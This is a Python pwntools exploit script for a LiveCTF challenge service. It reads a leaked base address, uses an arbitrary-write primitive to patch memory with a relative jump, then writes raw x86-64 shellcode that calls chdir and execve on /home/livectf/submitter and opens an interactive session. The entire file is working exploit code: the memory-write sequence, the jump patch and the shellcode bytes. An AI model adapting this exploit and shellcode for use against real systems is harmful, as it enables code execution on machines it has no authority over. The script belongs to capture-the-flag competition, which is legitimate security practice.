import argparse
from pwn import *

context.log_level = 'debug'

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000",
                    help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

base = u64(r.recv(8))
print(f"{base:x}")

r.send(p64(0x4330 + base))
r.send(p64(0x1370 + base))

r.send(p64(0x4338 + base))
r.send(p64(0x2000 + base))

# End writes
r.send(p64(0))

r.send(p32(0))

r.recvline_contains(b"Correct!")

base_2 = u64(r.recv(8))
assert base == base_2

r.send(p64(0x00002158 + base))
# jmp 0x2000
r.send(b'\xe9\xa3\xfe\xff\xff\xf4\xf4\xf4')

# chdir("/home/livectf")
# execve("/home/livectf/submitter", NULL, NULL)
sc = b"""H\xb8vectf\x00\x00\x00PH\xb8/home/liPH\x89\xe7H\xc7\xc0P\x00\x00\x00\x0f\x05H\xb8bmitter\x00PH\xb8vectf/suPH\xb8/home/liPH\x89\xe7H1\xf6H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05"""
sc += b'\x00' * (8 - (len(sc) % 8))

for i in range(0, len(sc), 8):
    r.send(p64(0x2000 + base + i))
    r.send(sc[i:i+8])

# End writes
r.send(p64(0))

# the flag should Just Fall Out

r.interactive()
